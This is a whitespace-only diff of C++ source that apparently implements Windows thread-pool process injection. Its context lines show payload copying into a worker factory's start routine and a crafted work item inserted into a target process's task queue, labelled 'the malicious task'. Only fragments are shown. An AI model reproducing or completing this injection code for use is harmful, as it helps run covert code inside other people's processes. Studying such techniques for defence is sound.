@@ -15,7 +15,6 @@ bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE h
 	fnNtQueryInformationWorkerFactory pNtQueryInformationWorkerFactory = nullptr;
 	uint32_t                          threadMinimumCount               = 0;
 
-
 	//
 	// Get function ptrs
 	//
@@ -35,8 +34,6 @@ bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE h
 		return false;
 	}
 
-
-
 	//
 	// Get Start Routine of the worker factory
 	//
@@ -52,8 +49,6 @@ bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE h
 		NTAPI_ERR(NtQueryInformationWorkerFactory, status);
 		return false;
 	}
-
-
 
 	//
 	// Change start routine to R/W and copy payload
@@ -92,8 +87,6 @@ bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE h
 		return false;
 	}
 
-	
-
 	//
 	// Increase minimum number of threads in the pool
 	//
@@ -114,8 +107,6 @@ bool InjectViaWorkerFactoryStartRoutine(_In_ HANDLE targetProcess, _In_ HANDLE h
 
 	return true;
 }
-
-
 
 
 //
@@ -150,8 +141,6 @@ bool InjectViaTpWork(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 		return false;
 	}
 
-
-
 	//
 	// Create FULL_TP_WORK callback structure
 	//
@@ -165,8 +154,6 @@ bool InjectViaTpWork(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 		WIN32_ERR(CreateThreadPoolWork);
 		return false;
 	}
-
-
 
 	//
 	// Query worker factory for StartRoutine value (head of linked list work queue)
@@ -186,8 +173,6 @@ bool InjectViaTpWork(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 		state = false;
 		goto FUNC_CLEANUP;
 	}
-
-
 
 	//
 	// Allocate Heap Buffer for TP_POOL structure and copy it
@@ -218,8 +203,6 @@ bool InjectViaTpWork(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 		goto FUNC_CLEANUP;
 	}
 
-
-
 	//
 	// Associate the callback with the process' TP_POOL
 	//
@@ -230,8 +213,6 @@ bool InjectViaTpWork(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 	pFullTpWork->Task.ListEntry.Flink = taskQueueHighPriorityList;
 	pFullTpWork->Task.ListEntry.Blink = taskQueueHighPriorityList;
 	pFullTpWork->WorkState.Exchange = 0x2;
-
-
 
 	//
 	// Write the callback structure into the process
@@ -265,8 +246,6 @@ bool InjectViaTpWork(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 		goto FUNC_CLEANUP;
 	}
 
-
-
 	//
 	// Modify the TP_POOL linked list Flinks and Blinks to point to the malicious task
 	//
@@ -297,9 +276,7 @@ bool InjectViaTpWork(_In_ HANDLE targetProcess, _In_ void* payloadAddress, _In_ 
 	}
 
 
-
 	FUNC_CLEANUP:
-
 	if (pFullTpPoolBuffer) {
 		HeapFree(GetProcessHeap(), 0, pFullTpPoolBuffer);
 	}
